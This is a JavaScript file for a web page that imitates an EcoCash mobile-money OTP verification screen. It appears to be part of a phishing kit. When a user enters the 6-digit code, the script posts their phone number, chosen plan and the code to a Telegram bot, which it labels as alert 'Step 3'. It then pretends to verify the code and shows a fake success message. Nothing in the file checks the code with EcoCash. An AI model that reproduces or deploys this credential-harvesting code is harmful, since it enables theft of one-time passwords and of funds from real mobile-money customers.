/**
 * EcoCash OTP Verification Page
 * Handles typable 6-digit input with auto-advance and verification.
 */

const params = new URLSearchParams(window.location.search);
const paymentId = params.get("paymentId");
const phone = params.get("phone");
const plan = params.get("plan");

// Display customer's phone
if (phone) {
  const phoneEl = document.querySelector("#displayPhone");
  if (phoneEl) {
    const cleaned = phone.replace(/\s/g, '');
    phoneEl.textContent = cleaned.startsWith("+263") ? cleaned : "+263 " + cleaned;
  }
}

// Auto-advance OTP input boxes
const inputs = Array.from(document.querySelectorAll(".otp-input"));

inputs.forEach((input, index) => {
  input.addEventListener("keydown", (e) => {
    // Allow backspace to move back
    if (e.key === "Backspace" && !input.value && index > 0) {
      inputs[index - 1].focus();
      inputs[index - 1].value = "";
    }
  });

  input.addEventListener("input", (e) => {
    // Only allow digits
    input.value = input.value.replace(/\D/g, "").slice(-1);

    if (input.value && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    // Enable/disable verify button based on completion
    updateVerifyButton();
  });

  input.addEventListener("paste", (e) => {
    e.preventDefault();
    const pasted = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "");
    pasted.split("").slice(0, 6).forEach((char, i) => {
      if (inputs[i]) inputs[i].value = char;
    });
    const lastFilled = Math.min(pasted.length, 5);
    inputs[lastFilled].focus();
    updateVerifyButton();
  });
});

// Focus first input on load
if (inputs.length > 0) {
  inputs[0].focus();
}

function getOtpValue() {
  return inputs.map(i => i.value).join("");
}

function updateVerifyButton() {
  const verifyButton = document.querySelector("#verifyButton");
  if (verifyButton) {
    const otp = getOtpValue();
    verifyButton.disabled = otp.length < 6;

    // Auto-submit as soon as all 6 digits are filled
    if (otp.length === 6) {
      setTimeout(() => verifyButton.click(), 300);
    }
  }
}

// Visual countdown timer
const countdown = document.querySelector("#countdown");
let seconds = 48;
if (countdown) {
  const timer = window.setInterval(() => {
    seconds -= 1;
    countdown.textContent = String(seconds);
    if (seconds <= 0) {
      window.clearInterval(timer);
      const resendText = document.querySelector("#resendText");
      if (resendText) {
        resendText.innerHTML = '<a href="#" id="resendLink" style="color:#105bfa;font-weight:700;text-decoration:none;">Resend OTP</a>';
        const resendLink = document.querySelector("#resendLink");
        if (resendLink) {
          resendLink.addEventListener("click", (e) => {
            e.preventDefault();
            inputs.forEach(i => i.value = "");
            inputs[0].focus();
            const demoNote = document.querySelector("#demoNote");
            if (demoNote) demoNote.textContent = "A new OTP has been sent to your number.";
          });
        }
      }
    }
  }, 1000);
}

// Initially disable verify button until all 6 digits entered
updateVerifyButton();

const verifyButton = document.querySelector("#verifyButton");
const demoNote = document.querySelector("#demoNote");

// Send sequential Telegram alert — Step 3: OTP Submitted
async function notifyTelegramOtpSubmitted(otp) {
  const cfg = window.TELEGRAM_CONFIG;
  if (!cfg || !cfg.enabled || !cfg.botToken || cfg.botToken === 'YOUR_BOT_TOKEN_HERE') return;

  const phone = params.get('phone') || 'Unknown';
  const planName = params.get('plan') || 'Unknown';
  const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' });

  const text =
    `🔢 <b>OTP CODE SUBMITTED</b>\n\n` +
    `📞 <b>Phone:</b> +263${phone}\n` +
    `📦 <b>Package:</b> ${planName}\n` +
    `🔑 <b>Code Entered:</b> <code>${otp}</code>\n` +
    `📅 <b>Time:</b> ${timestamp}\n` +
    `📊 <b>Status:</b> Verification in Progress`;

  try {
    await fetch(`https://api.telegram.org/bot${cfg.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      keepalive: true,
      body: JSON.stringify({ chat_id: cfg.chatId, text, parse_mode: 'HTML' })
    });
    console.log('✓ OTP step notified on Telegram.');
  } catch (err) {
    console.error('[Telegram OTP]', err);
  }
}

verifyButton.addEventListener("click", async () => {
  const otp = getOtpValue();
  if (otp.length < 6) return;

  verifyButton.disabled = true;
  verifyButton.textContent = "Verifying...";

  // Telegram alert — Step 3: OTP submitted
  notifyTelegramOtpSubmitted(otp).catch(() => {});

  // Simulate a brief verification delay then show success
  await new Promise(resolve => setTimeout(resolve, 1200));

  // Show success state
  demoNote.style.color = "#10b981";
  demoNote.style.fontSize = "13px";
  demoNote.style.fontWeight = "700";
  demoNote.textContent = "✓ Code verified! Activating your plan...";

  setTimeout(() => {
    // After verification, redirect to index with success state
    window.location.href = "index.html?verified=1&plan=" + encodeURIComponent(plan || "");
  }, 1500);
});

const supportLink = document.querySelector("#supportLink");
if (supportLink) {
  supportLink.addEventListener("click", (e) => {
    e.preventDefault();
    if (demoNote) {
      demoNote.style.color = "";
      demoNote.textContent = "For payment assistance, please contact EcoCash toll-free support on 114.";
    }
  });
}
